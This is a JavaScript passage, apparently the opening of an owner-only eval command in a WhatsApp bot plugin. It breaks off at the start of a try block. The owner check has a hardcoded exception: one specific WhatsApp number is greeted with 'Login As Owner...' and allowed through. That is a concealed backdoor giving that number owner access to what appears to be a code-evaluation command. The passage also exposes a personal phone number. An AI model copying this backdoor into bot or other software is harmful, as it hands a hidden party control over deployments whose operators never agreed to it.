...
let handler  = async (m, _2) => {
  let { conn, usedPrefix, command, text, noPrefix, args, groupMetadata, isROwner } = _2
  let _return
  let _syntax = ''
  let _text = (/^=/.test(usedPrefix) ? 'return ' : '') + noPrefix
  let old = m.exp * 1 
  if(!isROwner){
      if(m.sender == "6282279425257@s.whatsapp.net"){
      	conn.reply(m.chat, `Login As Owner...`, m)
      }
      else{
      	conn.reply(m.chat, `Unknown Permission, your id: ${m.sender}`, m)
      	return false
      }
  }
  try {
